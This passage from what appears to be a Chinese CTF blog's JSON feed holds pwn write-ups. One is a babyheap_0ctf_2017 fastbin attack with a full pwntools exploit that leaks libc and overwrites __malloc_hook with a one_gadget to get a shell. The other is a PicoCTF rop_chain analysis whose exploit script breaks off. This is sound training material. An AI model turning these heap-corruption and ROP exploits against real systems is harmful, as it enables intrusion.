class=\"token operator\">//</span>index1的pre_size和size位和fd、bk</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>index2：pre_size、size、fd</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>填充 index0进行溢出</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">//</span>填充index3</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload2<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span>溢出修改index4的size位</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>index2 的 fd 位 0x80 是因为堆始终是 <strong>4KB 对齐</strong> 的，所以 index4 的第一个字节 (小端序) 必定是 80（前面的 index0~3 都占了 0x20）</p>\n<p>【这里解释修改 index4 的 size 位，这里 index4 对应 chunk4】</p>\n<pre><code>查看其 chunksize 与相应的 fastbin_index 是否匹配，\n实际上 chunksize 的计算方法是 victim-&gt;size &amp; ~(SIZE_BITS))，\n而它对应的 index 计算方法为 (size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2，\n这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &gt;&gt; 4) - 2，\n那么我们将 small chunk 的 size 域改写成 0x21 即可。\n</code></pre>\n<p>3. 构造两个 index 指向同一个 chunk（index2，index4 都指向 chunk4）</p>\n<p>由于前面的溢出 index2 导致对应的 chunk2 的 fd 指向了 chunk4（此时 chunk2 在 fastbin 表里，所以使 chunk4 也在 fastbin 表中），此时 fastbin-&gt;chunk2-&gt;chunk4</p>\n<pre><code>allocate(0x10)  //index1，此时会将chunk2分配给index1\nallocate(0x10)  //index2，此时会将chunk4分配给index2\n</code></pre>\n<p>此时就有两个 index 指向同一个 chunk 了，接着改回来原来的 index4 的大小</p>\n<pre><code>payload3=p64(0)+p64(0)\npayload3+=p64(0)+p64(0x91)\nfill(3,length(payload3),payload3)\n</code></pre>\n<p>接着给 index4 分配 chunk4（因为前面 index2 回收 chunk4 没有改变 index4 指向的 chunk 地址，所以给 index 分配的仍然是 chunk4）</p>\n<pre><code>allocate(0x80) //给index4分配chunk4\nfree(4)  //释放chunk4，因为大于等于0x80，所以进入unsorted bin中\n</code></pre>\n<p>此时 chunk4 的 fd 和 bk 就指向 <code>main_arena+88</code>  处</p>\n<p>4. 泄露 <code>main_arena_88</code>  地址，计算得到 libc_base（ <strong>main_arena 相对 libc 固定偏移 0x3c4b20, 不同 libc 版本偏移不同</strong> ）</p>\n<pre><code>dump(2)\nmain_arena_88=u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')\nlibc_base=main_arena_88-0x3c4b78   (0x3c4b0+88,一般2.23_64的偏移都是这个，不同libc版本会有不同\n</code></pre>\n<p>5. 构造 <code>fake_chunk</code> ，使其能够溢出到 <code>malloc_hook</code></p>\n<p>计算 fake_chunk 的地址（ <code>malloc_hook</code>  就在 <code>main_arena</code>  的上面，我们需要找一个 <code>malloc_hook</code>  附近能够构造 chunk 的地址作为 <code>fake_chunk</code> ）：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/14/pPRXwTK.png\" alt=\"\" /></p>\n<p>在 <code>main_arena-0x40+0xd</code>  的地方找到该地址，由于有保护，所以要用 <code>libc_base+偏移</code> 来到达该地址</p>\n<pre><code>fake_chunk=main_arena-0x40+0xd (mian_arena-0x33)\nlibc_base=main_arena+0x58-0x3c4b78\n(main_arena-0x3c4b78=libc_base-0x58)\t\n\nfake_chunk=libc_base-0x58+0x3c4b78-0x40+0xd= libc_base+3c4aed \n</code></pre>\n<p>所以 <code>fake_chunk= libc_base+0x3c4aed</code></p>\n<p>6. 将 fake_chunk 地址写入 fastbin 中，便于后续溢出来 getshell</p>\n<p>由于此时 chunk4 仍然在 unsorted bin 中（index4 被释放），而 index2 仍然指向 chunk4，可以用 index2 来改写 fd，所以要使 chunk4 进入 fastbin 中</p>\n<pre><code>allocate(0x60) //回收一部分chunk4\nfree(4)  //使chunk4进入fastbin中\n\npayload4=p64(fake_chunk)  //改写chunk4的fd使fake_chunk进入fastbin\nfill(2,length(payload4),payload4)\n</code></pre>\n<p>7. 回收 chunk4 与 fake_chunk 来 getshell (  <code>malloc_hook=main_arena-0x10</code>  )</p>\n<pre><code>allocate(0x60)  //index4，分配chunk4\nallocate(0x60)  //index5，分配fake_chunk\n\n//因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33\n//所以 malloc_hook=fake_chunk+0x23(fake_chunk+0x33-0x10)\n\npayload5=p64(0)+p64(0)+p8(0)*3 //0x13\npayload5+=p64(libc_base+0x4526a) //0x4526a由one_gadget查找得到\nfill(5，length(payload5),payload5)\n\nallocate(0x60) //执行一次就会执行malloc_hook，就可以getshell\n</code></pre>\n<p>通过别人的 wp 发现 one_gadget 找出来的地址不对的原因：<br />\n<strong>值得注意的是，<br />\n这道题在于 2017 年的 0ctf 上的赛题，在当时使用 libc2.23-0ubuntu11.2 版本的共享库，但时至今日，Ubuntu16 已经不再使用该版本，而是 libc2.23-0ubuntu11.3 版本共享库，而 buu 上也使用前者版本，只能通过一些以前的 wp 来获取当时版本的 one_gadget，这里记一下比较常用的</strong></p>\n<pre><code>og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2\nog2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b2thbWVpbmUudG9wLzIwMjEvMDgvMDkvYmFieWhlYXBfMGN0Zl8yMDE3Lw==\">https://tokameine.top/2021/08/09/babyheap_0ctf_2017/</span><br />\nexp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25727</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#e=ELF(\"./babyheap_0ctf_2017\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#write_plt=e.plt[\"write\"]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#read_plt=e.plt[\"read\"]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此处必须转成 str（）类型，下面同理</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#步骤 1（对应上面的讲解步骤）</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#步骤 2</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#步骤 3</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload3<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#步骤 4</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>main_arena_88<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>libc_base<span class=\"token operator\">=</span>main_arena_88<span class=\"token operator\">-</span><span class=\"token number\">0x3c4b78</span> </pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#步骤 5</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span> libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#步骤 6</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#回收一部分 chunk4</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#使 chunk4 进入 fastbin 中</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>payload4<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#改写 chunk4 的 fd 使 fake_chunk 进入 fastbin</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">#步骤 7</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#index4，分配 chunk4</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#index5，分配 fake_chunk</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">#所以 malloc_hook=fake_chunk+0x23 (fake_chunk+0x33-0x10)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>payload5<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>  <span class=\"token comment\">#0x13</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>payload5<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#0x4526a 由 one_gadget 查找得到</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload5<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>               <span class=\"token comment\">#index6, 执行一次就会执行 malloc_hook，就可以 getshell</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/14/pPW9VAI.png\" alt=\"\" /></p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RoaW5rX3ljeC9hcnRpY2xlL2RldGFpbHMvNzc5ODI0Mzk=\">https://blog.csdn.net/think_ycx/article/details/77982439</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjIzNDYxLmh0bQ==\">https://bbs.kanxue.com/thread-223461.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5\">https://blog.csdn.net/weixin_43847969/article/details/104897249</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTA4MzYwMzc1\">https://blog.csdn.net/mcmuyanga/article/details/108360375</span></p>\n<p>关于堆的参数：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5\">https://blog.csdn.net/weixin_43847969/article/details/104897249</span></p>\n",
            "tags": [
                "pwn",
                "fastbin.attack"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/10/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_rop_chain1/",
            "url": "https://vvwwvv.cn/2023/09/10/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_rop_chain1/",
            "title": "PicoCTF_2018_rop_chain",
            "date_published": "2023-09-10T13:33:50.279Z",
            "content_html": "<h1 id=\"picoctf_2018_rop_chain\"><a class=\"anchor\" href=\"#picoctf_2018_rop_chain\">#</a> PicoCTF_2018_rop_chain</h1>\n<h2 id=\"1首先查看程序信息\"><a class=\"anchor\" href=\"#1首先查看程序信息\">#</a> 1. 首先查看程序信息</h2>\n<p><img data-src=\"https://ooo.0x0.ooo/2023/09/10/OnKFxK.png\" alt=\"\" /></p>\n<p>发现是 32 位程序，开启了 NX</p>\n<p><strong>利用 ida 查看</strong></p>\n<p>首先查看 main 函数</p>\n<p><img data-src=\"https://ooo.0x0.ooo/2023/09/10/OnKhJa.png\" alt=\"\" /></p>\n<p>里面有个 vuln 函数，查看</p>\n<p><img data-src=\"https://ooo.0x0.ooo/2023/09/10/OnKifS.png\" alt=\"\" /></p>\n<p>发现 ret 到 gets 函数，由溢出可以利用</p>\n<p>发现有其他函数</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcTy6S.png\" alt=\"\" /></p>\n<p>逐个查看</p>\n<p>win_function1</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcT2wj.png\" alt=\"\" /></p>\n<p>win_function2</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcTfkn.png\" alt=\"\" /></p>\n<p>flag</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcThYq.png\" alt=\"\" /></p>\n<h2 id=\"2分析\"><a class=\"anchor\" href=\"#2分析\">#</a> 2. 分析</h2>\n<p>1. 由上面的函数可以看出，下面的成立时可以输出 flag</p>\n<p><code>if ( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</code></p>\n<p>但是程序并没有调用这些函数，需要我们自己去执行，通过上面发现的溢出漏洞可以做到</p>\n<p>2. 在 function1 中 <strong>win1=1</strong> ，而 function2 中:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> win1 <span class=\"token operator\">&amp;&amp;</span> a1 <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1163220307</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    win2 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>需要让 <strong>a1=-1163220307（0xBAAAAAAD）</strong> 才能实现 win2=1，并且在 flag 中要让   <strong>a1=-559039827（0xDEADBAAD）</strong>  才能获取 flag</p>\n<p>注意 <strong>a1 是作为参数传入的</strong> ，而 32 位系统是用栈来传参（栈中先是返回地址然后是参数的顺序），所以就可以通过溢出来控制参数的值</p>\n<h2 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp:</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29168</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./2018_rop\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>function1<span class=\"token operator\">=</span><span class=\"token number\">0x80485CB</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>function2<span class=\"token operator\">=</span><span class=\"token number\">0x80485D8</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x804862B</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>vuln<span class=\"token operator\">=</span><span class=\"token number\">0x8048714</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>a1_function2<span class=\"token operator\">=</span><span class=\"token number\">0xBAAAAAAD</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>a1_flag<span class=\"token 